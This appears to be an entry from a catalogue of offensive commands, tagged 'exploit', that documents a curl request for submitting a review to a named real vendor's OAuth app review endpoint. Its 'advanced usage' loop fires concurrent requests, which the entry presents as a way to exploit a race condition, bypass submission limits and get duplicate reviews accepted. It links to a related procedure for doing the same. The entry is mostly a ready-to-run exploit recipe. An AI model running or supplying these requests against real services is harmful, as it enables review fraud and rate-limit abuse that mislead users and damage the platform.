---
data: >-
  curl -X POST 'https://api.coinbase.com/oauth/apps/{app_id}/reviews' -H
  'Authorization: Bearer {token}' -H 'Content-Type: application/json' -d
  '{"review": "Test review", "rating": 5}'
tags:
  - http
  - exploit
  - oauth
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:18.743Z'
id: fd279802-1d9f-4c14-ad8a-a3d239a538bb
verified: false
validated: true
submitted: true
---
# curl-submit-oauth-review

## Command

```bash
curl -X POST 'https://api.coinbase.com/oauth/apps/{app_id}/reviews' \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"review": "Test review", "rating": 5}'
```

## Description

This command submits a review to an OAuth application's review endpoint using curl, suitable for testing or exploiting race conditions by sending single or concurrent requests to bypass limits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `URL` | The review submission endpoint, e.g., https://api.coinbase.com/oauth/apps/{app_id}/reviews | Yes |
| `-H 'Authorization: Bearer {token}'` | Authentication header with Bearer token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{...}'` | JSON payload with review text and rating | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.example.com/oauth/apps/123/reviews' \
  -H 'Authorization: Bearer abc123' \
  -H 'Content-Type: application/json' \
  -d '{"review": "Great app", "rating": 5}'
```

### Advanced Usage

For concurrent execution in a script:

```bash
for i in {1..3}; do curl -X POST 'https://api.example.com/oauth/apps/123/reviews' -H 'Authorization: Bearer abc123' -H 'Content-Type: application/json' -d '{"review": "Review $i", "rating": 5}' & done
```

## Expected Output

A 200 OK response with JSON like {"status": "success", "review_id": "xyz"}, indicating the review was accepted. In case of duplicates due to race, multiple such responses without errors.

## Related

- [[Related Procedure: Exploit-Race-Condition-for-Multiple-OAuth-Reviews]]
